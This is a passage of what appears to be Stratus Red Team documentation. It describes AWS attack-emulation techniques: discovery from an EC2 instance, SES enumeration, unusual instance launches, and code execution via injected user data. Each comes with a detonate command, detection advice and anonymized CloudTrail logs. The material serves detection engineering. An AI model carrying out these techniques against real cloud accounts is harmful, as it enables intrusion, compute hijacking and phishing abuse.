\"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-westcentral-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000 is not authorized to perform: ec2:DescribeInstanceAttribute on resource: arn:aws:ec2:apiso-westcentral-3r:321848314756:instance/* because no identity-based policy allows the ec2:DescribeInstanceAttribute action. Encoded authorization failure message: cfE6FKZ1sIRhbxBLmjIoehSeEmbpj_8jIPsfCPuACT9E_rFPauBJrhN3AIXtPobElUTbZgN33aeBcq_atGfmGm0miGiE4oW5CWSkQVTPR_f6bJd-5PHBgkv_Evot_3vhSyAyN1nKUAakmm_Ne9bkqWRYabIiS-XBNwhbA49faTNvYUuwjEZKCJbpnCI9ir6J_ijM7bmlE0UAdVKWzn26SSgvgV9C0ex-YJoFslO-85IYC_09Ar0piVJjpmvVR0q04uuHw_W57DWJYjIs8n_PYyaH9fhp794rgvDzdxorm4rFwIlZKaudBGmGg0VYtmQzNLsYFXEpMX42A72nhCdEHoxZoTCpLJFLVVl2l4Fiuieud-NQxn8clqRwIWitTKGxpzKUlrLDzYS0NMJwjSleSiBtS8wJ-4t3iB7Y42OP-XNKN2DquxpmT1yIurR0nykVlvZtCzXuUdH39Z8spGqxCPJgZwd9o0G1X2-IwiP4MNeWQzYM8ZjN4vLOgNZsP85gJnCQxZSk8Vfk6XlS550Zd113KMl05ej2nYOO5sDtQNXFYR0xN4fTaQSi6XHLgtuN1xmqFaU\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a7ca94eb-492f-41e9-b23d-e4875b795041\",\n      \"eventName\": \"DescribeInstanceAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T19:52:34Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"321848314756\",\n      \"requestID\": \"8e437f72-d5eb-4c0a-b391-dd8d7f59eefb\",\n      \"requestParameters\": {\n         \"attribute\": \"userData\",\n         \"instanceId\": \"i-0c140b58\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"255.18.064.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-westcentral-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f193d7d4-8114-40ff-acc9-a123d5463ff3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA4URVX2JM5MT0ZGK8\",\n         \"accountId\": \"321848314756\",\n         \"arn\": \"arn:aws:sts::321848314756:assumed-role/stratus-red-team-get-usr-data-role/aws-go-sdk-1722455550269043000\",\n         \"principalId\": \"AROAUF4S4NNXFP6WTHD73:aws-go-sdk-1722455550269043000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-31T19:52:33Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"321848314756\",\n               \"arn\": \"arn:aws:iam::321848314756:role/stratus-red-team-get-usr-data-role\",\n               \"principalId\": \"AROAUF4S4NNXFP6WTHD73\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-get-usr-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/","title":"Execute Discovery Commands on an EC2 Instance","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Discovery</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#description","title":"Description","text":"<p>Runs several discovery commands on an EC2 instance:</p> <ul> <li>sts:GetCallerIdentity</li> <li>s3:ListBuckets</li> <li>iam:GetAccountSummary</li> <li>iam:ListRoles</li> <li>iam:ListUsers</li> <li>iam:GetAccountAuthorizationDetails</li> <li>ec2:DescribeSnapshots</li> <li>cloudtrail:DescribeTrails</li> <li>guardduty:ListDetectors</li> </ul> <p>The commands will be run under the identity of the EC2 instance role, simulating an attacker having compromised an EC2 instance and running discovery commands on it.</p> <p>Warm-up:</p> <ul> <li>Create the prerequisite EC2 instance and VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Run the discovery commands, over SSM. The commands will be run under the identity of the EC2 instance role.</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.discovery.ec2-enumerate-from-instance\n</code></pre>"},{"location":"attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/#detection","title":"Detection","text":"<p>Identify when an EC2 instance performs unusual enumeration calls.</p> <p>An action can be determined to have been performed by an EC2 instance under its instance role when the attribute <code>userIdentity.arn</code> of a CloudTrail event ends with <code>i-*</code>, for instance:</p> <p><code> arn:aws:sts::012345678901:assumed-role/my-instance-role/i-0adc17a5acb70d9ae </code></p>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/","title":"Enumerate SES","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Discovery</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#description","title":"Description","text":"<p>Simulates an attacker enumerating SES. Attackers frequently use this enumeration technique after having compromised an access key, to use it to launch phishing campaigns or further resell stolen credentials.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>Perform <code>ses:GetAccountSendingEnabled</code> to check if SES sending is enabled.</li> <li>Perform <code>ses:GetSendQuota</code> to discover the current email sending quotas.</li> <li>Perform <code>ses:ListIdentities</code> to discover the list of identities in the account.</li> <li>If identities are found, use <code>ses:GetIdentityVerificationAttributes</code> (only once) to discover verification status of each identity.</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/articles/following-attackers-trail-in-aws-methodology-findings-in-the-wild/#most-common-enumeration-techniques</li> <li>https://www.invictus-ir.com/news/ransomware-in-the-cloud</li> <li>https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/#post-125981-_kdq0vw6banab</li> <li>https://permiso.io/blog/s/aws-ses-pionage-detecting-ses-abuse/</li> <li>https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me</li> </ul>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.discovery.ses-enumerate\n</code></pre>"},{"location":"attack-techniques/AWS/aws.discovery.ses-enumerate/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>GetAccountSendingEnabled</code>, <code>GetSendQuota</code> and <code>ListIdentities</code> events.  These can be considered suspicious especially when performed by a long-lived access key, or when the calls span across multiple regions.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/","title":"Launch Unusual EC2 instances","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Execution</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li> <p>Resource Hijacking: Compute Hijacking - EC2 Use (T1496.A008)</p> </li> <li> <p>Modify Cloud Compute Infrastructure: Create Cloud Instance (T1578.002)</p> </li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#description","title":"Description","text":"<p>Attempts to launch several unusual EC2 instances (p2.xlarge).</p> <p>Warm-up: Creates an IAM role that doesn't have permissions to launch EC2 instances.  This ensures the attempts is not successful, and the attack technique is fast to detonate.</p> <p>Detonation: Attempts to launch several unusual EC2 instances. The calls will fail as the IAM role does not have sufficient permissions.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ec2-launch-unusual-instances\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#detection","title":"Detection","text":"<p>Trough CloudTrail events with the event name <code>RunInstances</code> and error <code>Client.UnauthorizedOperation</code>. The <code>eventSource</code> will be <code>ec2.amazonaws.com</code> and the <code>requestParameters.instanceType</code> field will contain the instance type that was attempted to be launched.</p> <p>Depending on your account limits you might also see <code>VcpuLimitExceeded</code> error codes.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-launch-unusual-instances/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ec2:RunInstances</code></p> </li> <li> <p><code>sts:AssumeRole</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ca-south-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::751353041310:assumed-role/stratus-red-team-ec2lui-role-idtzskbvtd/aws-go-sdk-1722511821294449000 is not authorized to perform: ec2:RunInstances on resource: arn:aws:ec2:ca-south-3r:751353041310:instance/* because no identity-based policy allows the ec2:RunInstances action. Encoded authorization failure message: T-kSWIRFn32_fxSgyNzoE36avE5lRaRniAjDs-OdhlNgyecEbeTN_dCroUmnEqAbDOrevkgWv8iyUzs0XJxEDlAcgDztlJ-QPNokwAE1JUrWPZcLqpsuM6kK46d5jCUvmzpU_Egq-fML4ed58JHxMdyU4Iz1WGOb6S3W3FB5jghu3JqyDR1B8S8qHryW-e8H1ukHarLt7Ogr4rvYezZ3sf_DNCPDjCGLOSI75x4W0X4Wcl9B9eAuhG-hRbB8KG3e-15CmtpWvw5brndvmrK0sAKwOdcyI47AXNV1DKVLKBNjxwNSQB4knWTX00TASAtGZYroYLyadRTdjZO_CwPGIkcI7wiuAPwSJTrri9xF8zPb5ZJ-Zt4-fQRZoge3sWBFv_wRNOcdGXu8MidJV1ev4CJOpwygM9bO68S_ueU2u_MvKE_zRYrMzTYSMiBKpZGZBDiIZGOGOSzJK8aZ5_F0g5CzhI0IzBxBQh2QFLF0eZe6prRdYEnOZ33EDlaD68PhuyM5xFYzNATqG8UlMtNG7eE1XCMpAmLRAv8ZSnE0PUMrg-Z7RhLyIb3p37VxzKKQHVTdEarNtE22jp38CJ0uRZy5eiNmu-O3JMLeB-AuSYFFoGPtH6h2dH2uV4Fj27vJ4...\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1a4debbb-12e9-4bde-b8c7-ea29002bb2a7\",\n      \"eventName\": \"RunInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T11:30:23Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"900138736586\",\n      \"requestID\": \"b663854b-4ebf-4be3-8de0-9c5471904762\",\n      \"requestParameters\": {\n         \"blockDeviceMapping\": {},\n         \"clientToken\": \"5dd59182-3917-421c-9b2c-7c92954b66ee\",\n         \"disableApiStop\": false,\n         \"disableApiTermination\": false,\n         \"instanceType\": \"p2.xlarge\",\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"imageId\": \"ami-aCBbfd13bdb1d1E4b\",\n                  \"maxCount\": 10,\n                  \"minCount\": 1\n               }\n            ]\n         },\n         \"monitoring\": {\n            \"enabled\": false\n         },\n         \"subnetId\": \"subnet-0e540f0c7ffb48ae9\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"06.237.252.245\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-south-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_c8ff220a-7e52-429b-868f-d979123ed2d3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA9F6MXE9HSYOXYQOS\",\n         \"accountId\": \"900138736586\",\n         \"arn\": \"arn:aws:sts::900138736586:assumed-role/stratus-red-team-ec2lui-role-idtzskbvtd/aws-go-sdk-1722511821294449000\",\n         \"principalId\": \"AROA13YEHY3VAS32TD341:aws-go-sdk-1722511821294449000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-08-01T11:30:22Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"900138736586\",\n               \"arn\": \"arn:aws:iam::900138736586:role/stratus-red-team-ec2lui-role-idtzskbvtd\",\n               \"principalId\": \"AROA13YEHY3VAS32TD341\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2lui-role-idtzskbvtd\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-south-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"04c882a5-7652-40d1-b44c-83535fc19268\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T11:30:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"900138736586\",\n      \"requestID\": \"a8b97cd6-132c-46e7-9305-85f2d79e683d\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::900138736586:role/stratus-red-team-ec2lui-role-idtzskbvtd\",\n         \"roleSessionName\": \"aws-go-sdk-1722511821294449000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::900138736586:role/stratus-red-team-ec2lui-role-idtzskbvtd\",\n            \"accountId\": \"900138736586\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::900138736586:assumed-role/stratus-red-team-ec2lui-role-idtzskbvtd/aws-go-sdk-1722511821294449000\",\n            \"assumedRoleId\": \"AROA13YEHY3VAS32TD341:aws-go-sdk-1722511821294449000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIA9F6MXE9HSYOXYQOS\",\n            \"expiration\": \"Aug 1, 2024, 11:45:22 AM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEIz//////////wEaCXVzLWVhc3QtMSJHMEUCIAIdMlsYBfJVLlnMTTUWOX4q3BfLOExnAgLuv5b76q5RAiEA3rFHZ/bap4mdvcTC7M6IzJfWZCdc4Llq3T4CoB3kjXMqqwIIdRABGgw3NTEzNTMwNDEzMTAiDHSUIyjlokGN2fzZcSqIArg4qYntF5grAv0etPkJsxlQnWjCUv5vMvslbaJ/9UP6X8zGTXz/dMdMJ17JdXdn/uGPrJcOXQ6igyD8Wkir0sEb8+SDAm9G7t5xDwSJS5qVz2PTP9tVmUahaBQR5jafJxPh2n8dOSpRAdR8D6iqcfDfAx1afwF8tdjkwcvZvH/rOo7HOGa0xK7U72SryDHkTo5Sz0I3NpGgbC/XZ/q/zFDSfRj11nR/w5ifdLleh+UZrnuHXMU6w2qILZBkX3ucTTwwN8PX+gsXJRgsaVaErMMlGyGyxovJeNuGx7PmV9lAaFeZM2/ZXwQanV6iOmYhQHG3WLuRIz9WvpNYMKCRI2Kn2FuBNJHx/zDO4621BjqdAdOjSmz/25ePFDD5bJYmd21ZQRd4gFjMVSKor2E+SSl6sQ+lY+MOHKEIvID+Afbi66+MnSAHSPvrCpj7f9mkHZWgS4GVoSWXujEUvok1xV+Ef+B/dQE7CjWKqNXgtyEWgWMKI/gQZdKYsvcGAg6tz5qdmbicTRqTwJiLvUwpj5dFdGJeKedOR5P2r/TSV/GHhVjwTSzg7rBgLT8zIkI=\"\n         }\n      },\n      \"sourceIPAddress\": \"06.237.252.245\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.ca-south-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_c8ff220a-7e52-429b-868f-d979123ed2d3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAR7ISFR69YWROPYAN\",\n         \"accountId\": \"900138736586\",\n         \"arn\": \"arn:aws:iam::900138736586:user/christophe\",\n         \"principalId\": \"AIDA32NEE582826ECMV4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-south-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9a6353be-6cb8-4a0c-ab85-a46dbd3a2b71\",\n      \"eventName\": \"AssumeRole\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T11:30:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"900138736586\",\n      \"requestID\": \"7197a903-38a0-4e24-8683-dc858142b3c8\",\n      \"requestParameters\": {\n         \"durationSeconds\": 900,\n         \"roleArn\": \"arn:aws:iam::900138736586:role/stratus-red-team-ec2lui-role-idtzskbvtd\",\n         \"roleSessionName\": \"aws-go-sdk-1722511821294449000\"\n      },\n      \"resources\": [\n         {\n            \"ARN\": \"arn:aws:iam::900138736586:role/stratus-red-team-ec2lui-role-idtzskbvtd\",\n            \"accountId\": \"900138736586\",\n            \"type\": \"AWS::IAM::Role\"\n         }\n      ],\n      \"responseElements\": {\n         \"assumedRoleUser\": {\n            \"arn\": \"arn:aws:sts::900138736586:assumed-role/stratus-red-team-ec2lui-role-idtzskbvtd/aws-go-sdk-1722511821294449000\",\n            \"assumedRoleId\": \"AROA13YEHY3VAS32TD341:aws-go-sdk-1722511821294449000\"\n         },\n         \"credentials\": {\n            \"accessKeyId\": \"ASIAYY9090UIYYUOIF2U\",\n            \"expiration\": \"Aug 1, 2024, 11:45:21 AM\",\n            \"sessionToken\": \"IQoJb3JpZ2luX2VjEIz//////////wEaCXVzLWVhc3QtMSJHMEUCIFzpG0H/IrDX9P0i5y29VWSdkBXkBTwULxR2KkPh4ApdAiEAiHLNdMOheLhjTV5lDnR7oekWR9V+zoDdU90CcpsOup0qqwIIdRABGgw3NTEzNTMwNDEzMTAiDK3uxtzFnKLcVORn9iqIAqQXShn68h/gmprileycyOQFlWvnjmy3JfNIoxpWT7miaEUekUaAVn9qGLQal+2Hyz4mqucWSFP4WCbDL+e5iS1xSz+oMowhtVvThjHV1AmKqxhivS1aoPOsy/P+NrxOyWSPyKuxyOn4khyFjsqDKc221zk5OFx+FqU+77es30KeJT4tJuRzwly679cnX9uUq0Y57yuIaHfAPFVy10EBeajT9wjI2/K9QJCcqKsshspDBRORU5PYiGJnCrcXy2SmumtW6EvH23kIUxYXE+Jv6aTrSCqo1kQDUvP+xYIxBYKR4Kn4zcVZUTgZC3k+plWaRThN/tSfA0aI67O61NQCn/Y0UUL0+5j0kTDN4621BjqdAay4li3+cvLrvgpNdyIMex2CAQbDOKEDCKe00MpLPka3vIDPDANof9D9SPJaynXl7b3t+fKxhMRo8MGyh/37wYhrD26qPAzbFA+Av75KyjEigzAsEyBYhi1Ix2nIYjm9jei10p0yiH1QSGerutzp1UQanzfgyzMpAtVJzy99kRFVKHE8j/rP5jc+iZFNdcDvYbs0tl9bP7kUFNDlVXg=\"\n         }\n      },\n      \"sourceIPAddress\": \"06.237.252.245\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.ca-south-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_c8ff220a-7e52-429b-868f-d979123ed2d3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAR7ISFR69YWROPYAN\",\n         \"accountId\": \"900138736586\",\n         \"arn\": \"arn:aws:iam::900138736586:user/christophe\",\n         \"principalId\": \"AIDA32NEE582826ECMV4\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/","title":"Execute Commands on EC2 Instance via User Data","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Execution</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#description","title":"Description","text":"<p>Executes code on a Linux EC2 instance through User Data.</p> <p>References:</p> <ul> <li>https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/</li> <li>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html</li> </ul> <p>Warm-up:</p> <ul> <li>Create the prerequisite EC2 instance and VPC (takes a few minutes).</li> </ul> <p>Detonation:</p> <ul> <li>Stop the instance</li> <li>Use ModifyInstanceAttribute to inject a malicious script in user data</li> <li>Start the instance</li> <li>Upon starting, the malicious script in user data is automatically executed as the root user</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ec2-user-data\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#detection","title":"Detection","text":"<p>Identify when the following sequence of CloudTrail events occur in a short period of time (e.g., &lt; 1 hour)</p> <ol> <li><code>StopInstances</code> (necessary, because the user data of an instance cannot be changed when it's running)</li> <li><code>ModifyInstanceAttribute</code> with <code>requestParameters.userData</code> non-empty</li> </ol> <p>When not possible to perform such correlation, alerting on the second event only is an option. It's generally not  expected that the user data of an EC2 instance changes often, especially with the popularity of immutable machine images, provisioned before instantiation.</p>"},{"location":"attack-techniques/AWS/aws.execution.ec2-user-data/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ec2:DescribeInstances</code></p> </li> <li> <p><code>ec2:ModifyInstanceAttribute</code></p> </li> <li> <p><code>ec2:StartInstances</code></p> </li> <li> <p><code>ec2:StopInstances</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"759fa0d5-d7d6-4de3-97f0-c469d1a0f92c\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:24Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"a9c78483-c047-4215-94c6-89794dd3b44e\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"914d32bb-067a-413c-adb1-cc8c4600261c\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"977121cb-f370-439d-9aa3-5dea3af27c6a\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b38fe645-91d4-404b-8d64-024a6f7e00cd\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"fff5f8d6-d152-4d32-913e-a5fedaa6aa2f\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"55e470c0-611d-4549-ad87-a7c830a75063\",\n      \"eventName\": \"StartInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:04:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"0c9bbf8a-a6f6-4e64-8396-78017a647f26\",\n      \"requestParameters\": {\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": {\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"currentState\": {\n                     \"code\": 0,\n                     \"name\": \"pending\"\n                  },\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\",\n                  \"previousState\": {\n                     \"code\": 80,\n                     \"name\": \"stopped\"\n                  }\n               }\n            ]\n         },\n         \"requestId\": \"0c9bbf8a-a6f6-4e64-8396-78017a647f26\"\n      },\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         